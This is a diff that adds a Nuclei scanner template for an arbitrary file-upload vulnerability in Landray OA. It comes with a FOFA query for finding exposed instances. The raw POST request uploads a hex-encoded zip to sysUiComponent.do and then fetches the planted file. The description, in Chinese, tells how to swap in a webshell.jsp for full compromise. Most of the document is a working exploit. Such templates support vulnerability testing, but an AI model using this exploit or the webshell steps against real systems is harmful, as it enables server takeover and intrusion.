@@ -1,0 +1,53 @@
+id: landray_sys_ui_component_upload
+
+info:
+  name: landray_sys_ui_component_upload
+  author: Xc1Ym
+  severity: critical
+  description: |
+    创建一个`component.ini`，里面第一行写id=2023，第二行写name=webshell.jsp，然后创建一个webshell.jsp的文件，两个打包成webshell.zip上传即可
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="Landray-OA系统"
+  tags: upload,OA,landray,hw,intrusive
+
+variables:
+  filename: '{{rand_base(6)}}'
+
+http:
+  - raw:
+      - |
+        POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 524
+        Content-Type: multipart/form-data; boundary=---------------------------15610248407689
+        Cookie: SESSION=YmI0OGMyZDQtZDE0NC00MTQ2LWJmMzMtNWE5NDMwOTYxM2Ex
+        DNT: 1
+        Connection: close
+
+        -----------------------------15610248407689
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.zip"
+        Content-Type: application/x-zip-compressed
+        -----------------------------15610248407689
+
+        {{hex_decode("504B030414000000080014677157E2F93F3B19000000170000000D000000636F6D706F6E656E742E696E69CB4CB135323032E6E5CA4BCC4DB52D4CACC84BD22BA9280100504B03041400000000000C677157B1D12A830500000005000000090000007161786E622E7478747161786E62504B0102140014000000080014677157E2F93F3B19000000170000000D0024000000000000002000000000000000636F6D706F6E656E742E696E690D0A002000000000000100180067C89B721219DA01C411E8721219DA015843B1561219DA01504B010214001400000000000C677157B1D12A8305000000050000000900240000000000000020000000440000007161786E622E7478740D0A002000000000000100180022DCE0691219DA0133A9576A1219DA013C3E79631219DA01504B05060000000002000200BA0000007000000000000D0D0A")}}
+        -----------------------------15610248407689
+      - |
+        GET /resource/ui-component/2023/qaxnb.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body_2, "qaxnb")
+          - "status_1 == 200"
+          - "status_2 == 200"
+          - contains(body_1, "directoryPath")
+        condition: and
+# digest: 4a0a00473045022100cf171601948aa235f90a5d2ba3e37c6449feaf4119cad79ffc74a10a3d5551cf0220658a1044a8b27fc291c5038ac5a046631d0b0539ec5b3cd5fb4c240a093aaaa7:6b2dd5af372f02ed15a56faf8ad98cf9
